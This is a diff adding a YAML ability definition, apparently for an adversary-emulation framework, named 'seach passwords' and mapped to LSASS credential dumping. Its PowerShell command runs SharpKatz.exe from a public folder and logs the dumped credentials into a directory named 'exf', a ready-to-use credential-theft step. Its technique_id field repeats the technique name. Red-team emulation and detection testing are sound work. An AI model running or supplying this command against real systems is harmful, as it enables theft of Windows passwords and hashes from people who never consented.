@@ -1,0 +1,28 @@
+- name: seach passwords
+  description: dump passwords using sharpkatz
+  tactic: credential-access
+  technique_id: 'OS Credential Dumping: LSASS Memory'
+  technique_name: 'OS Credential Dumping: LSASS Memory'
+  executors:
+  - payloads: []
+    platform: windows
+    name: psh
+    cleanup: []
+    parsers: []
+    command: "$Katz = \"$env:PUBLIC\\Toolz\\SharpKatz.exe\";\n$KatzLogFile = \"$env:PUBLIC\\\
+      exf\\Katz.log\";\nif ([System.IO.File]::Exists(\"$katz\")) \n{\nWrite-Output\
+      \ \"GREAT. The command $Katz has been found :-)\" | Out-File -FilePath \"$KatzLogFile\"\
+      ;\n$ServiceCmd = \"$Katz\";\nInvoke-Expression \"$ServiceCmd\"  | Out-File -FilePath\
+      \ \"$KatzLogFile\" -Append;\nexit 0;\n}\nelse \n{\nWrite-Output \"The command\
+      \ $Katz does not exists !!!\" | Out-File -FilePath \"$KatzLogFile\";\nexit 1;\n\
+      };"
+  repeatable: false
+  additional_info: {}
+  privilege: ''
+  singleton: true
+  buckets: []
+  requirements: []
+  access: {}
+  cleanup: []
+  delete_payload: false
+  id: sharpkatz
